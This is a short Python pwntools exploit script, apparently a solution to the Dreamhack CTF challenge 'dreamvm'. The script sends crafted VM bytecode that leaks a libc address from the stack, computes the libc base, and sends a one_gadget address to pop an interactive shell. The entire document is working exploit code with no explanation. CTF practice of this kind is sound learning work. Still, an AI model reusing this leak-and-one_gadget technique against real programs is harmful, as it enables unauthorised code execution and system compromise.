from pwn import *

# context.log_level = 'debug'
e = ELF('./dreamvm')
p = process('./dreamvm')
# p = remote('host1.dreamhack.games',9326)
libc = e.libc
code = 0x0000000000601040

'''
1 push
2 pop
3 add
4 stack mov
5 write
6 read
'''

# pause()
pay = '\x04' + p64(0x30) # stack
pay += '\x02' # reg <- stack pop
pay += '\x05' # reg -> leak
pay += '\x02'
pay += '\x06' # read <- reg
pay += '\x01'
pay += '\x01'

pay = pay.ljust(0x100,'\xff')
p.send(pay)

l = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info(hex(l))
libc_base = l - (libc.symbols['__libc_start_main'] + 231)
log.info(hex(libc_base))

one_gadget = libc_base + 0x10a45c
p.send(p64(one_gadget))

p.interactive()
